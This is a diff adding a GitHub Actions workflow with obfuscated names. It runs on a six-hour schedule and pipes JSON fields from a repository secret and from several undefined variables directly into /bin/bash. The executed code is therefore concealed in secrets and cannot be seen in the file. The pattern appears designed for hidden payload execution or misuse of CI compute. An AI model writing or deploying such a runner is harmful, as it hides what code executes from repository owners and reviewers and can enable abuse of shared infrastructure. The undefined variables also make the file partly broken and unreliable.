@@ -1,0 +1,23 @@
+name: duanqirui2603
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanqirui2603
+        env:
+          grfg39: ${{ secrets.grfg39 }}
+        run: |
+          echo $grfg39 | jq -r .y0 | /bin/bash
+          echo $olau57079 | jq -r .w5 | /bin/bash
+          echo $yqr06007 | jq -r .coab19 | /bin/bash
+          echo $b859 | jq -r .sad3 | /bin/bash
+          echo $gimw1 | jq -r .gs1 | /bin/bash
+          echo $j9331 | jq -r .zkx5799 | /bin/bash
+
